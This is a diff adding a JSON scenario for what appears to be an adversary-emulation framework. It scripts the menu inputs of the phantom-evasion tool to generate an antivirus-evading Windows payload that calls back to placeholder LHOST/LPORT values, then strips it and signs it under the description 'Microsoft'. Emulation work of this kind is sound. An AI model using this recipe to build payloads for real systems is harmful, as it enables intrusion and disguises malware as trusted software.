@@ -1,0 +1,99 @@
+{
+    "windows_10_1511": {
+        "TA24_T1345_P1": {
+            "scenario_tactic": {
+                "name": "Build_Capabilities",
+                "id": "TA0024"
+            },
+            "scenario_technique": {
+                "name": "Create custom payloads",
+                "id": "T1345"
+            },
+            "procedure": {
+                "classification": {
+                    "scenario_type": "helper_scenario",
+                    "name": "payload generation",
+                    "classification_id": "TA24_T1345_P1",
+                    "job-role": "System/Network Admin",
+                    "difficulty": "3"
+                },
+                "environment": {
+                    "platform": "Windows 10 pro",
+                    "version": "1511",
+                    "service-protocol": null,
+                    "cve": "",
+                    "configuration": {
+                        "settings": null
+                    }
+                },
+                "execution": {
+                    "platform": "windows_10_1511",
+                    "tool": "phantom-evasion",
+                    "command-prefix": "python3",
+                    "folder-path": "/home/Tools/Phantom-Evasion/",
+                    "absolute-path": "/home/Tools/Phantom-Evasion/phantom-evasion.py",
+                    "input": [
+                        {
+                            "Please insert option": "1"
+                        },
+                        {
+                            "Please insert option": "2"
+                        },
+                        {
+                            "Please insert option": "2"
+                        },
+                        {
+                            "Please insert payload number": "3"
+                        },
+                        {
+                            "Press Enter to continue": ""
+                        },
+                        {
+                            "Please insert LHOST": "LHOST_$ref"
+                        },
+                        {
+                            "Please insert LPORT": "LPORT_$ref"
+                        },
+                        {
+                            "Please insert output filename": "PAYLOAD_NAME_$ref"
+                        },
+                        {
+                            "Add multiple processes behaviour": "n"
+                        },
+                        {
+                            "Strip executable\\?": "y"
+                        },
+                        {
+                            "Sign executable\\?": "y"
+                        },
+                        {
+                            "use already existing certificate": "y"
+                        },
+                        {
+                            "Select a Certificate": "1"
+                        },
+                        {
+                            "Insert sign software description": "Microsoft"
+                        },
+                        {
+                            "Press Enter to continue": ""
+                        },
+                        {
+                            "Please insert option": "0"
+                        }
+                    ],
+                    "options": {
+                        "LHOST_$ref": "LHOST_$ref",
+                        "LPORT_$ref": "LPORT_$ref",
+                        "PAYLOAD_NAME_$ref": "PAYLOAD_NAME_$ref"
+                    },
+                    "access": {
+                        "access-type": "",
+                        "access-level": "",
+                        "path-execution-file": ""
+                    }
+                }
+            }
+        }
+    }
+}
